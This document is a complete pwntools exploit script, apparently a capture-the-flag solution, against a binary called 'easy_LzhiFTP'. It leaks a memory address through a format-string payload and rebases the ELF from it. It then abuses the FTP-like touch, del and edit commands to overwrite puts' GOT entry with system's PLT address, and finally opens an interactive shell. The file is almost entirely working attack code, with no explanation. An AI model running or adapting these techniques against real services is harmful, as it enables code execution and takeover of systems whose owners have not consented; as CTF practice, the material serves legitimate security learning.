
# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.arch = "amd64"
context.terminal = ["/usr/bin/tmux","sp","-h"]
binary = 'easy_LzhiFTP'
local = 1
if local == 1:
    #io=process(argv=['qemu-mipsel','-g','1234','-L','./','pwn'])
    io=process(argv=['./easy_LzhiFTP'])
else:
    io=remote('127.0.0.1',49156)
elf=ELF(binary)

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


sla('Username: ','1')
sla('Password: ',p64(0xa00000072))
sla('Server??(yes/No)','yes%6$p')

ru('0x')
leak_addr = int(rn(12), 16)
lg('leak_addr')
elf_base = leak_addr - 0x2096
lg('elf_base')
puts_got = elf.got['puts'] + elf_base
system_plt = elf_base + elf.plt['system']

for i in range(16):
    sla('IMLZH1-FTP> ','touch /bin/sh\x00')
    sla('write Context:','d1ag0n')

sla('IMLZH1-FTP> ','del')
sla('idx:', '0')

sla('IMLZH1-FTP> ','touch ' + p64(puts_got))
sla('write Context:','d1ag0n')

sla('IMLZH1-FTP> ','edit')
sla('idx:', '0')
sa('Content: ', p64(system_plt))

sla('IMLZH1-FTP> ','ls')
#dbg()
#pause()
irt()